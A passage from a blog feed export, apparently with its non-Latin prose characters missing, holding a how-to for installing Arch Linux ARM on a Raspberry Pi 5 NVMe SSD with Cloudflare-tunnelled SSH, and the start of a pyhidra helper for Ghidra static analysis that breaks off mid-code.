href="https://www.raspberrypi.com/documentation/computers/raspberry-pi.html#BOOT_ORDER">raspberrypi.com&#x2F;documentation&#x2F;computers&#x2F;raspberry-pi.html#BOOT_ORDER</a></li><li><code>sudo rpi-eeprom-update -a</code> </li></ol><h2 id="3--nvme"><a href="#3--nvme" class="headerlink" title="3.  nvme"></a>3.  nvme</h2><p> <a href="https://shop.pimoroni.com/products/nvme-base?variant=41219587178579">pimoroni</a>,  pi ,  <code>lsblk</code>  SSD </p><h2 id="4--Arch"><a href="#4--Arch" class="headerlink" title="4.  Arch"></a>4.  Arch</h2><ol start="0"><li> USB boot  SSH</li><li>,  <code>cfdisk</code> ( <code>sudo cfdisk /dev/nvme0n1</code>), ,  <code>&gt;=300Mb</code>  boot </li><li> <code>sudo apt install libarchive-tools</code>  <code>bsdtar</code></li><li> <code>root</code> (<code>sudo</code>),  <a href="https://kiljan.org/2023/11/24/arch-linux-arm-on-a-raspberry-pi-5-model-b/">kiljan.org&#x2F;2023&#x2F;11&#x2F;24&#x2F;arch-linux-arm-on-a-raspberry-pi-5-model-b</a><br>()   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># SSD </span></span><br><span class="line"><span class="built_in">export</span> SDDEV=/dev/nvme0n1</span><br><span class="line"><span class="built_in">export</span> SDPARTBOOT=/dev/nvme0n1p1</span><br><span class="line"><span class="built_in">export</span> SDPARTROOT=/dev/nvme0n1p2</span><br><span class="line"><span class="built_in">export</span> SDMOUNT=/mnt/sd</span><br><span class="line"><span class="built_in">export</span> DOWNLOADDIR=/tmp/pi</span><br><span class="line"><span class="built_in">export</span> DISTURL=<span class="string">&quot;http://os.archlinuxarm.org/os/ArchLinuxARM-rpi-aarch64-latest.tar.gz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$DOWNLOADDIR</span></span><br><span class="line">(</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">$DOWNLOADDIR</span> &amp;&amp; \</span><br><span class="line">curl -JLO <span class="variable">$DISTURL</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#sfdisk --quiet --wipe always $SDDEV &lt;&lt; EOF</span></span><br><span class="line"><span class="comment">#,256M,0c,</span></span><br><span class="line"><span class="comment">#,,,</span></span><br><span class="line"><span class="comment">#EOF</span></span><br><span class="line"></span><br><span class="line">mkfs.vfat -F 32 <span class="variable">$SDPARTBOOT</span></span><br><span class="line">mkfs.ext4 -E lazy_itable_init=0,lazy_journal_init=0 -F <span class="variable">$SDPARTROOT</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$SDMOUNT</span></span><br><span class="line">mount <span class="variable">$SDPARTROOT</span> <span class="variable">$SDMOUNT</span></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$&#123;SDMOUNT&#125;</span>/boot/firmware</span><br><span class="line">mount <span class="variable">$SDPARTBOOT</span> <span class="variable">$&#123;SDMOUNT&#125;</span>/boot/firmware</span><br><span class="line"></span><br><span class="line">bsdtar -xpf <span class="variable">$&#123;DOWNLOADDIR&#125;</span>/ArchLinuxARM-rpi-aarch64-latest.tar.gz -C <span class="variable">$SDMOUNT</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="variable">$&#123;SDMOUNT&#125;</span>/boot/*</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$&#123;DOWNLOADDIR&#125;</span>/linux-rpi</span><br><span class="line"><span class="built_in">pushd</span> <span class="variable">$&#123;DOWNLOADDIR&#125;</span>/linux-rpi</span><br><span class="line"><span class="comment"># ,  404</span></span><br><span class="line"><span class="comment">#  https://archlinuxarm.org/packages/aarch64/linux-rpi </span></span><br><span class="line">curl -JLO http://mirror.archlinuxarm.org/aarch64/core/linux-rpi-6.6.16-1-aarch64.pkg.tar.xz</span><br><span class="line">tar xf *</span><br><span class="line"><span class="built_in">cp</span> -rf boot/* <span class="variable">$&#123;SDMOUNT&#125;</span>/boot/firmware</span><br><span class="line"><span class="built_in">popd</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">sync</span></span><br><span class="line">umount -R <span class="variable">$SDMOUNT</span></span><br></pre></td></tr></table></figure>  <code>/boot/firmware</code>  <code>/boot</code>  <a href="https://www.raspberrypi.com/documentation/computers/configuration.html#the-boot-folder">raspberrypi.com&#x2F;documentation&#x2F;computers&#x2F;configuration.html#the-boot-folder</a>.</li><li> SSD ()<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">mount /dev/nvme0n1p2 /mnt/sd</span><br><span class="line">mount /dev/nvme0n1p1 /mnt/sd/boot/firmware</span><br></pre></td></tr></table></figure></li><li> <code>sudo vim /mnt/sd/etc/fstab</code>, <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Static information about the filesystems.</span></span><br><span class="line"><span class="comment"># See fstab(5) for details.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;file system&gt; &lt;dir&gt; &lt;type&gt; &lt;options&gt; &lt;dump&gt; &lt;pass&gt;</span></span><br><span class="line"><span class="comment"># &lt;pass&gt; is the order of loading parition</span></span><br><span class="line"><span class="comment"># main partition</span></span><br><span class="line">/dev/nvme0n1p2  /               ext4    defaults        0       1</span><br><span class="line"><span class="comment"># boot partition</span></span><br><span class="line">/dev/nvme0n1p1  /boot/firmware  vfat    defaults        0       2</span><br></pre></td></tr></table></figure></li><li> <code>sudo vim /mnt/sd/boot/firmware/cmdline.txt</code><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root=/dev/nvme0n1p2 rootfstype=ext4 rw rootwait console=serial0,115200 console=tty1 fsck.repair=yes</span></span><br><span class="line"><span class="comment"># root=UUID=0000-0000 rootfstype=ext4 rw rootwait console=serial0,115200 console=tty1 fsck.repair=yes</span></span><br><span class="line"><span class="attr">root</span>=PARTUUID=<span class="number">00000000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">000000000000</span> rootfstype=ext4 rw rootwait console=serial0,<span class="number">115200</span> console=tty1 fsck.repair=<span class="literal">yes</span></span><br></pre></td></tr></table></figure> <code>PARTUUID</code>, UUID,  <code>ls /dev/disk/by-partuuid -al</code>, <code>ls /dev/disk/by-uuid -al</code>  <code>lsblk</code> </li><li>  USB, </li></ol><h2 id="5--Arch"><a href="#5--Arch" class="headerlink" title="5.  Arch"></a>5.  Arch</h2><ul><li></li><li>[]  SSH <code>~/.ssh/authorized_keys</code></li><li> <code>ntp</code></li><li> <code>locale</code></li><li>[]  <code>zsh</code> <code>omz</code></li><li> <code>iwd</code> <ul><li> <code>iwctl</code>  <code>station wlan0 connect &lt;UID&gt;</code> </li><li><code>sudo systemctl enable --now iwd</code> </li><li> <code>sudo vim /etc/iwd/main.conf</code>, <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[Settings]</span></span><br><span class="line"><span class="attr">AutoConnect</span>=<span class="literal">true</span></span><br><span class="line"><span class="section">[General]</span></span><br><span class="line"><span class="attr">EnableNetworkConfiguration</span>=<span class="literal">true</span></span><br><span class="line"><span class="section">[Network]</span></span><br><span class="line"><span class="attr">EnableIPv6</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure> wifi ,  <code>dhcph</code>  <code>ipv6</code></li></ul></li><li>[?]  <code>dhcph</code><ul><li><code>sudo systemctl enable --now dhcph</code></li><li>[?]  <code>/etc/dhcpcd.conf</code>  ipv6</li></ul></li><li>,  alarm</li><li> <code>hostname</code> ( <code>alarm</code>)</li><li>[]  <code>linux-rpi-16k</code><ul><li> <code>boot</code>   <code>linux-rpi</code> ,  <code>/boot/kernel8.img</code>  <code>/boot/firmware/kernel8.img</code></li></ul></li><li>[] Arch  <code>sudo pacman -S rpi5-eeprom</code> </li><li>[]  <code>pacman</code>  image   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">==&gt; WARNING: errors were encountered during the build. The image may not be complete.</span><br><span class="line">error: command failed to execute correctly</span><br></pre></td></tr></table></figure>   <code>/etc/mkinitcpio.conf</code>  <code>HOOKS</code> ,  <code>kms</code>  <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># removed kms</span></span><br><span class="line"><span class="attr">HOOKS</span>=(base udev autodetect modconf keyboard keymap consolefont block filesystems fsck)</span><br></pre></td></tr></table></figure>   <a href="https://archlinuxarm.org/forum/viewtopic.php?f=15&t=16672&start=40#p72020">archlinuxarm</a></li></ul><h3 id="Troubleshooting"><a href="#Troubleshooting" class="headerlink" title="Troubleshooting"></a>Troubleshooting</h3><p>,  16k page ( <code>uname -a</code>  <code>lsmod</code> ),  <code>pacman -Syyu</code> ,  <code>PKGBUILD</code>  <code>/boot/kernel8.img</code> ( Arch Linux ARM  <code>PKGBUILD</code> ).  <code>sudo cp /boot/kernel8.img /boot/firmware/kernel8.img</code> .</p><h2 id="6--Cloudflare--SSH"><a href="#6--Cloudflare--SSH" class="headerlink" title="6. [] Cloudflare  SSH"></a>6. [] Cloudflare  SSH</h2><blockquote><p> <code>cloudflare</code>  <code>tunnel</code>,  <code>tunnel</code>  Pi  SSH (, )<br>0.  pi  arch  SSH</p></blockquote><ol><li> docker  <code>cloudflared</code>  ( <a href="https://github.com/cloudflare/cloudflared/issues/1151#issuecomment-1888738119">issue#1151</a>  <code>2024.1.0</code>  <code>go</code> , ), </li><li> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cloudflare/go.git</span><br><span class="line"><span class="built_in">cd</span> go/src</span><br><span class="line">./make.bash</span><br></pre></td></tr></table></figure>  <code>cloudflare</code>  <code>go</code> </li><li> <code>go/bin/</code>  <code>PATH</code> </li><li> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/cloudflare/cloudflared.git</span><br><span class="line"><span class="built_in">cd</span> cloudflared</span><br><span class="line">make cloudflared</span><br></pre></td></tr></table></figure>  <code>cloudflared</code></li><li> <code>cloudflared/</code>  <code>PATH</code> </li><li> <code>cloudflare</code>  <code>tunnel</code><img src="/images/rpi5-arch4.png" alt="tunnel"> <code>SSH</code>  <code>public hostname</code></li><li> <code>cloudflared</code>  <code>tunnel</code> , <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> cloudflared service install &lt;TOKEN&gt;</span><br></pre></td></tr></table></figure></li><li><code>sudo systemctl enable --now cloudflared</code></li><li> pc  <code>sudo pacman -S cloudflared</code></li><li> <code>.ssh/config</code>  <code>cloudflared</code>  <code>ProxyCommand</code>  <code>cloudflared access ssh --hostname %h</code>,  <a href="https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/use-cases/ssh/#native-terminal">developers.cloudflare.com&#x2F;cloudflare-one&#x2F;connections&#x2F;connect-networks&#x2F;use-cases&#x2F;ssh</a></li></ol><h2 id="7--GUI"><a href="#7--GUI" class="headerlink" title="7. [] GUI"></a>7. [] GUI</h2><p> Hyprland<br><em> <code>pacman -S hyprland</code>  <code>Hyprland</code> ,  H</em></p><center>-  :) -</center>]]></content>
      
      
      <categories>
          
          <category> How-to </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Arch </tag>
            
            <tag> Raspberry Pi5 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python  pyhidra  Ghidra  static analysis</title>
      <link href="/2023/12/04/python-pyhidra-static-analysis/"/>
      <url>/2023/12/04/python-pyhidra-static-analysis/</url>
      
        <content type="html"><![CDATA[<h2 id="0-Prep"><a href="#0-Prep" class="headerlink" title="0. Prep"></a>0. Prep</h2><ol><li> <code>ghidra</code> <code>pacman -S ghidra</code><br> i.  <code>ghidra</code>  <code>echo &quot;export GHIDRA_INSTALL_DIR=/opt/ghidra&quot; &gt;&gt; ~/.zshrc</code> ()</li><li> <a href="https://pypi.org/project/pyhidra/"><code>pyhidra</code></a> <code>pip install pyhidra</code></li><li>[Optional]  <a href="https://pypi.org/project/ghidra-stubs/"><code>ghidra-stub</code></a> <code>pip install ghidra-stub</code></li></ol><h2 id="1-Usage"><a href="#1-Usage" class="headerlink" title="1. Usage"></a>1. Usage</h2><h3 id="1-0-Helper-Tools"><a href="#1-0-Helper-Tools" class="headerlink" title="1.0 Helper Tools"></a>1.0 Helper Tools</h3><p> <code>pyhidra</code> :  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> helper <span class="keyword">import</span> FAIL</span><br><span class="line"><span class="keyword">import</span> traceback</span><br><span class="line"><span class="keyword">import</span> atexit</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> GHIDRA_BASE</span><br><span class="line"></span><br><span class="line"><span class="comment"># this file is a modified version pyhidra.core.open_program and pyhidra.core._setup_project</span></span><br><span class="line"><span class="comment"># original credit for pyhidra</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> contextlib</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span>, ContextManager</span><br><span class="line"><span class="keyword">from</span> pyhidra.core <span class="keyword">import</span> _analyze_program, _get_compiler_spec, _get_language</span><br><span class="line"><span class="keyword">from</span> pyhidra.converters <span class="keyword">import</span> *  <span class="comment"># pylint: disable=wildcard-import, unused-wildcard-import</span></span><br><span class="line"><span class="keyword">from</span> ghidra.base.project <span class="keyword">import</span> GhidraProject</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Union</span>, <span class="type">Tuple</span>, ContextManager</span><br><span class="line"><span class="keyword">from</span> ghidra.program.model.listing <span class="keyword">import</span> Program</span><br><span class="line"></span><br><span class="line">_project: GhidraProject | <span class="literal">None</span> = <span class="literal">None</span></span><br><span class="line">_program_pool: <span class="built_in">dict</span>[<span class="built_in">str</span>, <span class="string">&quot;Program&quot;</span>] = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_setup_project2</span>(<span class="params"></span></span><br><span class="line"><span class="params">        binary_path: <span class="type">Union</span>[<span class="built_in">str</span>, Path],</span></span><br><span class="line"><span class="params">        language: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        compiler: <span class="built_in">str</span> | <span class="literal">None</span> = <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Tuple</span>[<span class="string">&quot;GhidraProject&quot;</span>, <span class="string">&quot;Program&quot;</span>]:</span><br><span class="line">    <span class="keyword">from</span> java.io <span class="keyword">import</span> IOException</span><br><span class="line">    <span class="keyword">global</span> _project</span><br><span class="line">    <span class="keyword">assert</span> _project <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        binary_path = Path(binary_path)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Open/Create project</span></span><br><span class="line">    program: <span class="string">&quot;Program&quot;</span> | <span class="literal">None</span> = <span class="literal">None</span></span><br><span class="line">    project = _project</span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># if project.getRootFolder().getFile(binary_path.name): # since this not works</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            program = project.openProgram(<span class="string">&quot;/&quot;</span>, binary_path.name, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">except</span> IOException:</span><br><span class="line">            program = <span class="literal">None</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> language <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            program = project.importProgram(binary_path) <span class="comment"># type: ignore</span></span><br><span class="line">            <span class="keyword">if</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Ghidra failed to import &#x27;<span class="subst">&#123;binary_path&#125;</span>&#x27;. Try providing a language manually.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lang = _get_language(language)</span><br><span class="line">            comp = _get_compiler_spec(lang, compiler) <span class="comment"># type: ignore</span></span><br><span class="line">            program = project.importProgram(binary_path, lang, comp) <span class="comment"># type: ignore</span></span><br><span class="line">            <span class="keyword">if</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                message = <span class="string">f&quot;Ghidra failed to import &#x27;<span class="subst">&#123;binary_path&#125;</span>&#x27;. &quot;</span></span><br><span class="line">                <span class="keyword">if</span> compiler:</span><br><span class="line">                    message += <span class="string">f&quot;The provided language/compiler pair (<span class="subst">&#123;language&#125;</span> / <span class="subst">&#123;compiler&#125;</span>) may be invalid.&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    message += <span class="string">f&quot;The provided language (<span class="subst">&#123;language&#125;</span>) may be invalid.&quot;</span></span><br><span class="line">                <span class="keyword">raise</span> ValueError(message)</span><br><span class="line">        project.saveAs(program, <span class="string">&quot;/&quot;</span>, binary_path.name, <span class="literal">False</span>) <span class="comment"># True to False</span></span><br><span class="line">    <span class="keyword">assert</span> program <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> program <span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_setup_project</span>(<span class="params"></span></span><br><span class="line"><span class="params">        binary_path: <span class="type">Union</span>[<span class="built_in">str</span>, Path],</span></span><br><span class="line"><span class="params">        project_location: <span class="type">Union</span>[<span class="built_in">str</span>, Path] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        project_name: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        language: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        compiler: <span class="built_in">str</span> = <span class="literal">None</span></span></span><br><span class="line"><span class="params"></span>) -&gt; <span class="type">Tuple</span>[<span class="string">&quot;GhidraProject&quot;</span>, <span class="string">&quot;Program&quot;</span>]:</span><br><span class="line">    <span class="keyword">from</span> ghidra.base.project <span class="keyword">import</span> GhidraProject</span><br><span class="line">    <span class="keyword">from</span> java.io <span class="keyword">import</span> IOException</span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        binary_path = Path(binary_path)</span><br><span class="line">    <span class="keyword">if</span> project_location:</span><br><span class="line">        project_location = Path(project_location)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        project_location = binary_path.parent</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> project_name:</span><br><span class="line">        project_name = <span class="string">f&quot;<span class="subst">&#123;binary_path.name&#125;</span>_ghidra&quot;</span></span><br><span class="line">    project_location = project_location / project_name</span><br><span class="line">    project_location.mkdir(exist_ok=<span class="literal">True</span>, parents=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Open/Create project</span></span><br><span class="line">    program: <span class="string">&quot;Program&quot;</span> = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        project = GhidraProject.openProject(project_location, project_name, <span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="comment"># if project.getRootFolder().getFile(binary_path.name): # since this not works</span></span><br><span class="line">            program = project.openProgram(<span class="string">&quot;/&quot;</span>, binary_path.name, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> IOException:</span><br><span class="line">        project = GhidraProject.createProject(project_location, project_name, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> binary_path <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">if</span> language <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            program = project.importProgram(binary_path)</span><br><span class="line">            <span class="keyword">if</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;Ghidra failed to import &#x27;<span class="subst">&#123;binary_path&#125;</span>&#x27;. Try providing a language manually.&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            lang = _get_language(language)</span><br><span class="line">            comp = _get_compiler_spec(lang, compiler)</span><br><span class="line">            program = project.importProgram(binary_path, lang, comp)</span><br><span class="line">            <span class="keyword">if</span> program <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                message = <span class="string">f&quot;Ghidra failed to import &#x27;<span class="subst">&#123;binary_path&#125;</span>&#x27;. &quot;</span></span><br><span class="line">                <span class="keyword">if</span> compiler:</span><br><span class="line">                    message += <span class="string">f&quot;The provided language/compiler pair (<span class="subst">&#123;language&#125;</span> / <span class="subst">&#123;compiler&#125;</span>) may be invalid.&quot;</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    message += <span class="string">f&quot;The provided language (<span class="subst">&#123;language&#125;</span>) may be invalid.&quot;</span></span><br><span class="line">                <span class="keyword">raise</span> ValueError(message)</span><br><span class="line">        project.saveAs(program, <span class="string">&quot;/&quot;</span>, binary_path.name, <span class="literal">False</span>) <span class="comment"># True to False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> project, program</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@contextlib.contextmanager</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_program</span>(<span class="params"></span></span><br><span class="line"><span class="params">        binary_path: Path,</span></span><br><span class="line"><span class="params">        project_location: <span class="type">Union</span>[<span class="built_in">str</span>, Path] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        project_name: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        analyze=<span class="literal">True</span>,</span></span><br><span class="line"><span class="params">        language: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        compiler: <span class="built_in">str</span> = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>) -&gt; ContextManager[<span class="string">&quot;FlatProgramAPI&quot;</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Opens given binary path in Ghidra and returns FlatProgramAPI object.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param binary_path: Path to binary file, may be None.</span></span><br><span class="line"><span class="string">    :param project_location: Location of Ghidra project to open/create.</span></span><br><span class="line"><span class="string">        (Defaults to same directory as binary file)</span></span><br><span class="line"><span class="string">    :param project_name: Name of Ghidra project to open/create.</span></span><br><span class="line"><span class="string">        (Defaults to name of binary file suffixed with &quot;_ghidra&quot;)</span></span><br><span 